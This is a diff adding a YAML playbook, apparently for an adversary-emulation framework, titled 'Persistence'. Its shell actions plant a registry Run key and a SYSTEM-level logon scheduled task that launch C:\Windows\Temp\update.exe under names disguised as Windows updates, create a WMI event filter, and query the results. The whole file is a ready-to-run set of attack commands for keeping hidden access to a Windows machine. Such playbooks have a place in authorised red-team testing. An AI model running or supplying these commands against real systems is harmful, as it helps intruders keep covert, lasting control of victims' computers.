@@ -1,0 +1,32 @@
+name: Persistence
+# Establish persistence mechanisms
+
+actions:
+  # Registry run key
+  - name: registry_persistence
+    type: shell
+    parameters:
+      command: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate /t REG_SZ /d "C:\Windows\Temp\update.exe" /f
+
+  # Scheduled task
+  - name: schtask_persistence
+    type: shell
+    parameters:
+      command: schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\update.exe" /sc onlogon /ru SYSTEM /f
+    on_success:
+      - name: verify_task
+        type: shell
+        parameters:
+          command: schtasks /query /tn "WindowsUpdate"
+
+  # WMI event subscription (if admin)
+  - name: wmi_persistence
+    type: shell
+    parameters:
+      command: wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="WindowsUpdate", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+
+  # Verify persistence
+  - name: check_persistence
+    type: shell
+    parameters:
+      command: reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
